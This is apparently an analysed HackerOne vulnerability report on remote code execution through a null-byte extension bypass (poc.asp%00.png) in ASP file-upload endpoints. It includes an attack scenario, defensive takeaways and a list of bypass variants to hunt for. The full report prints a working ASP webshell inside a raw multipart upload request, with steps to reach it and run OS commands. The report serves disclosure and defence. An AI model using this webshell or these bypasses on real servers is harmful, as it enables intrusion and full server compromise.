# Remote Code Execution via Null Byte File Extension Bypass in File Upload

## Metadata
- **Source:** HackerOne
- **Report:** 2054184 | https://hackerone.com/reports/2054184
- **Submitted:** 2023-07-06
- **Reporter:** pizzapower
- **Program:** HackerOne (Undisclosed Program)
- **Bounty:** Not specified in report
- **Severity:** Critical
- **Vuln:** Arbitrary File Upload, Remote Code Execution, Null Byte Injection, File Extension Validation Bypass
- **CVEs:** None
- **Category:** memory-binary

## Summary
A file upload vulnerability exists in multiple repository endpoints that allows attackers to bypass file extension validation using null byte injection. By uploading a file with a malicious ASP extension preceded by a null byte (e.g., poc.asp%00.png), the server processes it as an executable script, enabling arbitrary code execution on the Windows-based server.

## Attack scenario
1. Attacker identifies file upload functionality across multiple repository endpoints through fuzzing
2. Attacker crafts a malicious ASP webshell containing command execution capabilities
3. Attacker embeds a null byte between ASP and PNG extensions (poc.asp%00.png) to bypass whitelist validation
4. Attacker submits the crafted file via multipart form data POST request to the upload endpoint
5. Server's validation logic truncates filename at null byte, treating it as poc.asp, but may log/store as .png
6. Attacker accesses the uploaded shell at /savefiles/poc.asp and executes arbitrary OS commands with server privileges

## Root cause
The file upload validation mechanism fails to properly handle null byte characters in filenames. Legacy ASP servers or the application's file handling code treats the null byte as a string terminator, effectively truncating the validated extension while the actual stored file retains executable permissions based on the truncated name.

## Attacker mindset
An attacker would recognize this as a classic null byte injection vulnerability that bypasses simplistic extension-based validation. They would systematically fuzz endpoints to discover upload functionality, then craft a proof-of-concept webshell to demonstrate unauthenticated RCE and full system compromise.

## Defensive takeaways
- Implement whitelist-based file type validation using MIME type detection and magic bytes, not just file extensions
- Sanitize and validate all filename inputs by removing null bytes and other special characters before processing
- Store uploaded files outside the webroot or in a non-executable directory with disabled script execution permissions
- Use randomized filenames with allowed extensions rather than preserving user-supplied names
- Implement Content-Disposition: attachment headers to prevent direct script execution
- Apply principle of least privilege to upload directory permissions and service account capabilities
- Perform regular security audits and penetration testing specifically targeting file upload functionality
- Keep web server and application frameworks patched to prevent null byte processing vulnerabilities

## Variant hunting
Test double encoding null bytes (%2500, ..%252e..)
Try alternative null byte representations in different character encodings (UTF-16, UTF-8 variations)
Probe for similar bypass patterns with other special characters (semicolon, space, backslash)
Test case sensitivity exploitation (ASp, aSP) combined with extension validation
Attempt polyglot file techniques combining executable and image formats
Fuzz other file upload endpoints with identical null byte patterns
Test whether logs reveal the true filename extension revealing server-side processing logic
Investigate if path traversal can be combined with null bytes for alternative code execution vectors

## MITRE ATT&CK
- T1190
- T1190
- T1204.002
- T1059.001
- T1570

## Notes
This report demonstrates a critical vulnerability affecting multiple production endpoints. The reporter identified at least 3 affected repositories through fuzzing. The proof-of-concept successfully achieved command execution on Windows infrastructure running ASP. The vulnerability appears to be a common misconfiguration in legacy ASP-based applications. The report lacks specific program information and bounty amount, suggesting possible disclosure sensitivity. The webshell was removed by the program before publication for security reasons, indicating legitimate program responsiveness.

## Full report
<details><summary>Expand</summary>

Hi,

I found "repos" at `https://███/` and `https://c█████████/` and this one (which doesn't have the file upload functionality appearing on the DOM, but it still may be there) `https://███████`.  There may be more, I had to fuzz a lot to find these. 

These repos contain file upload functionality. I found that if you place a null byte between file extensions, you can upload files with malicious extensions. 

Running the `dir` command at the uploaded file `https://████████/savefiles/poc.asp?cmd=dir`  - the shell has been deleted for security purposes. Let me know if you want me to reupload it. 

██████████

The request from burp - note the null byte: 

█████



*** Reproduction ***

1. Navigate to `https://███/`

2. Submit a file upload the same as the request I made above. Make sure there is a null byte between asp and png. 

3. Visit `https://████████/savefiles/poc.asp` and run commands. 


## Impact

Everything could be compromised.

## System Host(s)
████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Here is the actual request, but I'm not sure how well the null byte will translate. 

```
POST /repo/orbital/repo.asp?fileToUpload=pizza.asp HTTP/1.1
Host: ███
Cookie: ASPSESSIONIDCCSBDDQT=CAJLLPMCPOBLODENMGDGMADC
Content-Length: 1306
Sec-Ch-Ua: 
Accept: */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7RcvHwqSCmAtKCIB
X-Requested-With: XMLHttpRequest
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Sec-Ch-Ua-Platform: ""
Origin: https://███████
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://████████/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundary7RcvHwqSCmAtKCIB
Content-Disposition: form-data; name="myfile"; filename="poc.asp.png"


<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objshell.exec(thecommand)
    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%>


<HTML>
<BODY>
<FORM action="" method="GET">
<input type="text" name="cmd" size=45 value="<%= szCMD %>">
<input type="submit" value="Run">
</FORM>
<PRE>
<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
<%Response.Write(Request.ServerVariables("server_name"))%>
<p>
<b>The server's port:</b>
<%Response.Write(Request.ServerVariables("server_port"))%>
</p>
<p>
<b>The server's software:</b>
<%Response.Write(Request.ServerVariables("server_software"))%>
</p>
<p>
<b>The server's local address:</b>
<%Response.Write(Request.ServerVariables("LOCAL_ADDR"))%>
<% szCMD = request("cmd")
thisDir = getCommandOutput("cmd /c" & szCMD)
Response.Write(thisDir)%>
</p>
<br>
</BODY>
</HTML>



------WebKitFormBoundary7RcvHwqSCmAtKCIB--

```

*** Reproduction ***

1. Navigate to `https://███/`

2. Submit a file upload the same as the request I made above. Make sure there is a null byte between asp and png. 

3. Visit `https://████/savefiles/poc.asp` and run commands.

## Suggested Mitigation/Remediation Actions




</details>

---
*Analysed by Claude on 2026-05-24*
